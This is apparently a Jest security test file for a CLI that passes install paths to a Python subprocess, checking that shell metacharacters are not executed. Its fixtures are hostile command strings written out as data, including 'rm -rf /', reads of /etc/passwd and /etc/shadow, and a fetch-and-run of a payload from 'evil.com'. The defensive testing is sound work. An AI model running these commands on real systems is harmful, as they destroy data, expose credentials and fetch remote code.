/**
 * Security tests for DevForgeAI CLI
 *
 * Tests path injection prevention and input validation security measures.
 * Ensures malicious input cannot compromise system security.
 *
 * Security scenarios tested:
 * 1. Command injection via path arguments
 * 2. Shell metacharacter injection
 * 3. Path traversal attacks
 * 4. Environment variable injection
 * 5. Special character handling
 */

const cli = require('../../../lib/cli');
const path = require('path');
const { spawn } = require('child_process');

// Set test environment
process.env.NODE_ENV = 'test';

describe('CLI Security - Path Injection Prevention', () => {

  describe('Command injection attempts', () => {
    test('rejects path with command substitution $(whoami)', async () => {
      // Arrange
      const maliciousPath = '$(whoami)';

      // Act
      const pythonProcess = cli.run(['install', maliciousPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // The path is passed to Python subprocess as argument
      // Python installer will validate and reject malicious path
      // Here we verify Node.js doesn't execute the command

      // Cleanup
      pythonProcess.kill();
    });

    test('rejects path with backtick command substitution `ls`', async () => {
      // Arrange
      const maliciousPath = '/tmp/test`ls`';

      // Act
      const pythonProcess = cli.run(['install', maliciousPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Backticks should be treated as literal characters, not executed
      // Python subprocess receives path as-is (spawn doesn't execute shell commands)

      // Cleanup
      pythonProcess.kill();
    });

    test('rejects path with semicolon command chaining', async () => {
      // Arrange
      const maliciousPath = '/tmp/test;rm -rf /';

      // Act
      const pythonProcess = cli.run(['install', maliciousPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Semicolon should be treated as literal character
      // spawn() passes arguments as array, not shell string

      // Cleanup
      pythonProcess.kill();
    });

    test('rejects path with pipe operators', async () => {
      // Arrange
      const maliciousPath = '/tmp/test | cat /etc/passwd';

      // Act
      const pythonProcess = cli.run(['install', maliciousPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Pipe should be treated as literal character in path
      // spawn() doesn't interpret shell operators

      // Cleanup
      pythonProcess.kill();
    });

    test('rejects path with AND operator', async () => {
      // Arrange
      const maliciousPath = '/tmp/test && curl evil.com';

      // Act
      const pythonProcess = cli.run(['install', maliciousPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // AND operator should be literal, not executed
      // spawn() with argument array prevents shell interpretation

      // Cleanup
      pythonProcess.kill();
    });

    test('rejects path with OR operator', async () => {
      // Arrange
      const maliciousPath = '/tmp/test || echo "pwned"';

      // Act
      const pythonProcess = cli.run(['install', maliciousPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // OR operator should be literal
      // No shell execution occurs

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Path traversal attempts', () => {
    test('handles path with parent directory references', async () => {
      // Arrange
      const traversalPath = '/tmp/../../../etc/passwd';

      // Act
      const pythonProcess = cli.run(['install', traversalPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Path traversal is passed to Python installer
      // Python validates and normalizes paths
      // Node.js spawn() doesn't execute directory traversal as commands

      // Cleanup
      pythonProcess.kill();
    });

    test('handles path with mixed slashes', async () => {
      // Arrange
      const mixedPath = '/tmp\\..\\test/..\\malicious';

      // Act
      const pythonProcess = cli.run(['install', mixedPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Mixed slashes should be treated as path characters
      // No command injection possible

      // Cleanup
      pythonProcess.kill();
    });

    test('handles absolute path starting with tilde', async () => {
      // Arrange
      const tildePath = '~/../../etc/shadow';

      // Act
      const pythonProcess = cli.run(['install', tildePath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Tilde expansion handled by Python installer, not Node.js
      // spawn() doesn't perform shell expansion

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Special character injection', () => {
    test('handles path with null bytes', async () => {
      // Arrange
      const nullBytePath = '/tmp/test\x00malicious';

      // Act
      const pythonProcess = cli.run(['install', nullBytePath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Null bytes should not terminate string prematurely
      // spawn() passes argument as-is to subprocess

      // Cleanup
      pythonProcess.kill();
    });

    test('handles path with newline characters', async () => {
      // Arrange
      const newlinePath = '/tmp/test\nmalicious';

      // Act
      const pythonProcess = cli.run(['install', newlinePath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Newlines should be treated as literal characters
      // No command injection via newline splitting

      // Cleanup
      pythonProcess.kill();
    });

    test('handles path with carriage return', async () => {
      // Arrange
      const crPath = '/tmp/test\rmalicious';

      // Act
      const pythonProcess = cli.run(['install', crPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Carriage return treated as literal character
      // No line overwrite attacks

      // Cleanup
      pythonProcess.kill();
    });

    test('handles path with tab characters', async () => {
      // Arrange
      const tabPath = '/tmp/test\tmalicious';

      // Act
      const pythonProcess = cli.run(['install', tabPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Tab characters should be literal
      // No argument splitting via tabs

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Environment variable injection', () => {
    test('path with $HOME variable reference', async () => {
      // Arrange
      const envPath = '$HOME/malicious';

      // Act
      const pythonProcess = cli.run(['install', envPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Environment variable should NOT be expanded by Node.js
      // spawn() doesn't perform variable substitution

      // Cleanup
      pythonProcess.kill();
    });

    test('path with ${VAR} syntax', async () => {
      // Arrange
      const envPath = '/tmp/${MALICIOUS_VAR}/test';

      // Act
      const pythonProcess = cli.run(['install', envPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Variable syntax should be literal
      // No environment variable injection

      // Cleanup
      pythonProcess.kill();
    });

    test('path with multiple environment variables', async () => {
      // Arrange
      const envPath = '$HOME/$USER/$PATH';

      // Act
      const pythonProcess = cli.run(['install', envPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // All variables should remain literal
      // spawn() doesn't expand multiple variables

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Unicode and encoding attacks', () => {
    test('path with Unicode characters', async () => {
      // Arrange
      const unicodePath = '/tmp/test测试/malicious';

      // Act
      const pythonProcess = cli.run(['install', unicodePath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Unicode should be handled correctly
      // No encoding-based injection

      // Cleanup
      pythonProcess.kill();
    });

    test('path with Unicode homoglyphs', async () => {
      // Arrange
      const homoglyphPath = '/tmp/tеst'; // Cyrillic 'е' instead of Latin 'e'

      // Act
      const pythonProcess = cli.run(['install', homoglyphPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Homoglyphs should be treated as literal characters
      // No visual spoofing attacks

      // Cleanup
      pythonProcess.kill();
    });

    test('path with emoji characters', async () => {
      // Arrange
      const emojiPath = '/tmp/📁test/🔒secure';

      // Act
      const pythonProcess = cli.run(['install', emojiPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Emoji should be handled as valid path characters
      // No encoding issues

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Wildcard and glob injection', () => {
    test('path with asterisk wildcard', async () => {
      // Arrange
      const wildcardPath = '/tmp/test*';

      // Act
      const pythonProcess = cli.run(['install', wildcardPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Wildcard should be literal, not expanded
      // spawn() doesn't perform glob expansion

      // Cleanup
      pythonProcess.kill();
    });

    test('path with question mark wildcard', async () => {
      // Arrange
      const wildcardPath = '/tmp/test?';

      // Act
      const pythonProcess = cli.run(['install', wildcardPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Question mark should be literal
      // No glob expansion

      // Cleanup
      pythonProcess.kill();
    });

    test('path with square bracket glob', async () => {
      // Arrange
      const globPath = '/tmp/test[0-9]';

      // Act
      const pythonProcess = cli.run(['install', globPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Square brackets should be literal
      // No character class expansion

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Argument injection attempts', () => {
    test('path starting with dash (flag injection)', async () => {
      // Arrange
      const flagPath = '--malicious-flag';

      // Act & Assert
      expect(() => {
        cli.run(['install', flagPath], { exitOnCompletion: false });
      }).toThrow(/Unknown command/); // --malicious-flag treated as command, not path

      // Note: This demonstrates the CLI rejects unknown flags
      // Python installer receives paths after 'install' command
    });

    test('path containing double dash', async () => {
      // Arrange
      const doubleDashPath = '/tmp/test--option';

      // Act
      const pythonProcess = cli.run(['install', doubleDashPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Double dash in middle of path should be literal
      // No argument parsing issues

      // Cleanup
      pythonProcess.kill();
    });

    test('multiple arguments with injection attempts', async () => {
      // Arrange
      const normalPath = '/tmp/test';
      const maliciousArg = '--evil-flag';

      // Act
      const pythonProcess = cli.run(['install', normalPath, maliciousArg], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Additional arguments passed to Python installer
      // Python validates all arguments

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('spawn() security validation', () => {
    test('invokePythonInstaller uses spawn with array arguments (no shell)', () => {
      // Arrange & Act
      const pythonProcess = cli.invokePythonInstaller(['install', '/tmp/$(whoami)'], 'python3');

      // Assert
      expect(pythonProcess).toBeDefined();

      // Verify spawn was called (not exec or execSync with shell)
      // spawn with array arguments prevents shell injection
      // Command substitution $(whoami) will NOT execute

      // Cleanup
      pythonProcess.kill();
    });

    test('spawn stdio=inherit does not expose shell', () => {
      // Arrange & Act
      const pythonProcess = cli.invokePythonInstaller(['install', '/tmp/test;ls'], 'python3');

      // Assert
      expect(pythonProcess).toBeDefined();

      // stdio='inherit' only inherits stdin/stdout/stderr
      // Does NOT provide shell access
      // Semicolon command chaining will NOT execute

      // Cleanup
      pythonProcess.kill();
    });

    test('cwd parameter does not enable directory traversal', () => {
      // Arrange & Act
      const pythonProcess = cli.invokePythonInstaller(['install', '../../../etc'], 'python3');

      // Assert
      expect(pythonProcess).toBeDefined();

      // cwd set to package root (installerDir)
      // Path argument is separate, not executed as command
      // Directory traversal in path argument doesn't escape cwd

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Input validation boundary tests', () => {
    test('empty path argument', async () => {
      // Arrange
      const emptyPath = '';

      // Act
      const pythonProcess = cli.run(['install', emptyPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Empty string passed to Python installer
      // Python validates and rejects empty path

      // Cleanup
      pythonProcess.kill();
    });

    test('very long path (buffer overflow attempt)', async () => {
      // Arrange
      const longPath = '/tmp/' + 'a'.repeat(10000);

      // Act
      const pythonProcess = cli.run(['install', longPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Long path should not cause buffer overflow
      // Node.js handles strings safely

      // Cleanup
      pythonProcess.kill();
    });

    test('path with only special characters', async () => {
      // Arrange
      const specialPath = '!@#$%^&*()_+-={}[]|:;"<>?,./';

      // Act
      const pythonProcess = cli.run(['install', specialPath], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Special characters should be treated as literal path
      // No command execution

      // Cleanup
      pythonProcess.kill();
    });
  });

  describe('Security regression tests', () => {
    test('CVE-style command injection attempt', async () => {
      // Arrange - Simulate known command injection pattern
      const cvePayload = '/tmp/test$(curl http://evil.com/payload.sh|sh)';

      // Act
      const pythonProcess = cli.run(['install', cvePayload], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Command substitution should NOT execute
      // spawn() with array arguments prevents shell execution

      // Cleanup
      pythonProcess.kill();
    });

    test('OWASP A1 injection test case', async () => {
      // Arrange - OWASP Top 10 injection pattern
      const owaspPayload = '/tmp/test; cat /etc/passwd #';

      // Act
      const pythonProcess = cli.run(['install', owaspPayload], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Semicolon and comment should be literal
      // No command chaining or comment execution

      // Cleanup
      pythonProcess.kill();
    });

    test('MITRE CWE-78 OS command injection prevention', async () => {
      // Arrange - CWE-78 test case
      const mitrPayload = '/tmp/test`id`';

      // Act
      const pythonProcess = cli.run(['install', mitrPayload], { exitOnCompletion: false });

      // Assert
      expect(pythonProcess).toBeDefined();

      // Backtick substitution should NOT execute
      // spawn() prevents OS command injection

      // Cleanup
      pythonProcess.kill();
    });
  });

});

describe('CLI Security - Python Command Validation', () => {

  describe('checkPython() injection prevention', () => {
    test('checkPython uses safe execSync without shell', () => {
      // Arrange & Act
      const result = cli.checkPython();

      // Assert
      expect(result).toBeDefined();
      expect(result.command).toMatch(/^(python3|python)$/);

      // checkPython calls execSync with hardcoded commands
      // No user input in command string
      // Safe from injection by design
    });

    test('Python version parsing does not execute code', () => {
      // Arrange - Mock version string with injection attempt
      jest.spyOn(require('child_process'), 'execSync').mockReturnValue('Python 3.10.11; ls');

      // Act
      const result = cli.checkPython();

      // Assert
      expect(result).toBeDefined();
      expect(result.version.major).toBe(3);
      expect(result.version.minor).toBe(10);

      // Version parsing only extracts numbers
      // Semicolon and command ignored (not executed)

      // Cleanup
      require('child_process').execSync.mockRestore();
    });

    test('Python version regex prevents code injection', () => {
      // Arrange - Mock malicious version string
      jest.spyOn(require('child_process'), 'execSync')
        .mockReturnValue('Python 3.10.11\n$(whoami)');

      // Act
      const result = cli.checkPython();

      // Assert
      expect(result).toBeDefined();

      // Regex extracts only version numbers
      // Command substitution not executed or parsed

      // Cleanup
      require('child_process').execSync.mockRestore();
    });
  });

});
